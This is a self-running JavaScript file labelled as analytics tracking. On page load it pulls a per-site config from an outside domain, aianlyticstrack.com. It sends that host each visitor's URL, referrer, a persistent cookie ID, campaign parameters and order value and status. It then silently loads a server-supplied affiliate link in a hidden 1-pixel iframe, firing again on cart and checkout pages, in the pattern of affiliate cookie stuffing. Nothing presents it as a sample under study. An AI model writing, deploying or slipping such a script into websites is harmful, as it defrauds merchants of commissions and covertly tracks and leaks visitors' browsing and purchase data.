(function () {
    
    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
            var r = Math.random() * 16 | 0,
                v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

    
    function getCookie(cname) {
        var name = cname + '=';
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i].trim();
            if (c.indexOf(name) === 0) return c.substring(name.length, c.length);
        }
        return '';
    }

   
    function fireTracking(url) {
        try {
            const iframe = document.createElement('iframe');
            
            iframe.setAttribute("sandbox", "allow-same-origin allow-scripts allow-forms");
            iframe.src = url;
            iframe.style.display = 'none';
            iframe.style.visibility = 'hidden';
            iframe.style.width = '1px';
            iframe.style.height = '1px';
            iframe.style.border = '0';
            
           
            iframe.onerror = function() {
                var img = new Image();
                img.src = url;
            };

            document.body.appendChild(iframe);
            //console.log("Tracking Fired: ", url);
        } catch (e) {
            console.error("Iframe error:", e);
        }
    }

   
    async function initTracking(isCartEvent = false) {
        const storageKey = 'tracking_done_' + window.location.hostname;
        const cartStorageKey = 'tracking_cart_done_' + window.location.hostname;

        if (isCartEvent) {
            if (sessionStorage.getItem(cartStorageKey)) return;
        } else {
            if (sessionStorage.getItem(storageKey)) return;
        }

        try {
            let uniqueId = getCookie('tracking_uuid') || generateUUID();
            let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
            document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;SameSite=Lax';

            const queryParams = new URLSearchParams(window.location.search);
            const utmSource = queryParams.get('utm_source') || '';
            const utmMedium = queryParams.get('utm_medium') || '';
            const utmCampaign = queryParams.get('utm_campaign') || '';
            const campaignId = queryParams.get('campaign_id') || queryParams.get('campaign') || utmCampaign || '';
            const orderValue = queryParams.get('order_value') || queryParams.get('orderValue') || 0;
            const orderStatus = queryParams.get('order_status') || queryParams.get('orderStatus') || '';

            let response = await fetch('https://aianlyticstrack.com/api/track-user', {
                method: 'POST',
                keepalive: true,
                body: JSON.stringify({
                    url: window.location.href,
                    referrer: document.referrer,
                    unique_id: uniqueId,
                    origin: window.location.hostname,
                    timestamp: new Date().getTime(),
                    campaignId,
                    utmSource,
                    utmMedium,
                    utmCampaign,
                    orderValue: Number(orderValue) || 0,
                    orderStatus
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            
            let result = await response.json();

            if (result.blocked) {
                //console.log('Tracking blocked by backend cap:', result.reason);
                sessionStorage.setItem(storageKey, 'true');
                if (isCartEvent) sessionStorage.setItem(cartStorageKey, 'true');
                return;
            }

            if (result.success && result.affiliate_url) {
                fireTracking(result.affiliate_url);
            } else {
                fireTracking('https://aianlyticstrack.com/api/fallback-pixel?id=' + uniqueId);
            }

            sessionStorage.setItem(storageKey, 'true');
            if (isCartEvent) sessionStorage.setItem(cartStorageKey, 'true');
        } catch (error) {
            console.error('Tracking Failed:', error);
        }
    }

    const backendBaseUrl = 'https://aianlyticstrack.com';

    function isCartPage() {
        const cartPatterns = ["cart", "checkout", "pay", "shipping", "review-order"];
        return cartPatterns.some(path => window.location.pathname.toLowerCase().includes(path));
    }

    async function loadTrackingConfig(host) {
        try {
            const response = await fetch(`${backendBaseUrl}/api/tracking-config?hostname=${encodeURIComponent(host)}`);
            if (!response.ok) {
                console.warn('Tracking config fetch failed:', response.status, response.statusText);
                return {};
            }
            const configData = await response.json();
            return configData.config || {};
        } catch (error) {
            console.error('Failed to load tracking config:', error);
            return {};
        }
    }

    function executeInitTracking(site, isCartEvent = false) {
        initTracking(isCartEvent);
    }

    
  
    async function run() {
        const host = window.location.hostname;
        const site = await loadTrackingConfig(host);

        if (!site || Object.keys(site).length === 0) {
           // console.log('No backend tracking config found for', host);
            return;
        }

        if (site.always) {
            executeInitTracking(site);
        }

        if (site.cartExtra && isCartPage()) {
            setTimeout(() => executeInitTracking(site, true), 1500);
        }
    }

    if (document.readyState === "interactive" || document.readyState === "complete") {
        run();
    } else {
        window.addEventListener("DOMContentLoaded", run);
    }
})();